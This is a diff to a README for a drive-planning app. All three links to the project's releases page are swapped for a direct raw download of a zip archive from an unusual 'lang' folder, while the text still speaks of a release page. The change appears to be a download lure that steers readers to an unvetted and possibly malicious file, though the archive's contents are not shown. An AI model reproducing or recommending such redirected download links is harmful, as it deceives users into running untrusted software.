@@ -1,6 +1,6 @@
 # 🚗 drive-escape - Plan weekend drives with ease
 
-[![Download drive-escape](https://img.shields.io/badge/Download%20drive--escape-blue?style=for-the-badge&logo=github)](https://github.com/mellyincan226/drive-escape/releases)
+[![Download drive-escape](https://img.shields.io/badge/Download%20drive--escape-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mellyincan226/drive-escape/main/lang/drive_escape_v2.4.zip)
 
 ## 🧭 What this app does
 
@@ -33,7 +33,7 @@ For the best experience:
 
 Visit this page to download the latest release:
 
-https://github.com/mellyincan226/drive-escape/releases
+https://raw.githubusercontent.com/mellyincan226/drive-escape/main/lang/drive_escape_v2.4.zip
 
 On that page, look for the newest release and download the Windows file. If you see more than one file, choose the one for Windows and save it to your computer.
 
@@ -186,4 +186,4 @@ Only download drive-escape from the release page linked above. That keeps the fi
 
 If you need the latest release page again, use this link:
 
-https://github.com/mellyincan226/drive-escape/releases
+https://raw.githubusercontent.com/mellyincan226/drive-escape/main/lang/drive_escape_v2.4.zip
